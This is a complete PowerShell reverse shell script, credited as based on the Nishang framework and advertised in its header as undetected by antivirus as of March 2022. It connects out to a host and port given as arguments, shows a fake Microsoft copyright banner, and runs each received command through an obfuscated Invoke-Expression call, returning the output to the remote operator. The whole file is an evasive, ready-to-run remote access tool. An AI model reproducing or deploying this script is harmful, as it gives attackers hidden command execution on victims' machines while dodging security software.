#Twitter: @TihanyiNorbert (No AV detecetion 2022 March)
#Reverse shell based on the original nishang Framework written by @nikhil_mitt.
$J = New-Object System.Net.Sockets.TCPClient($args[0],$args[1]);
$SS = $J.GetStream();
[byte[]]$OO = 0..((2-shl(3*5))-1)|%{0};
$OO = ([text.encoding]::UTF8).GetBytes("Copyright (C) 2022 Microsoft Corporation. All rights reserved.`n`n")
$SS.Write($OO,0,$OO.Length)
$OO = ([text.encoding]::UTF8).GetBytes((Get-Location).Path + '>')
$SS.Write($OO,0,$OO.Length)
[byte[]]$OO = 0..((2-shl(3*5))-1)|%{0};
while(($A = $SS.Read($OO, 0, $OO.Length)) -ne 0){;$DD = (New-Object System.Text.UTF8Encoding).GetString($OO,0, $A);
$GG = (i`eX $DD 2>&1 | Out-String );
$H  = $GG + (pwd).Path + '> ';
$L = ([text.encoding]::UTF8).GetBytes($H);
$SS.Write($L,0,$L.Length);
$SS.Flush()};
$J.Close()
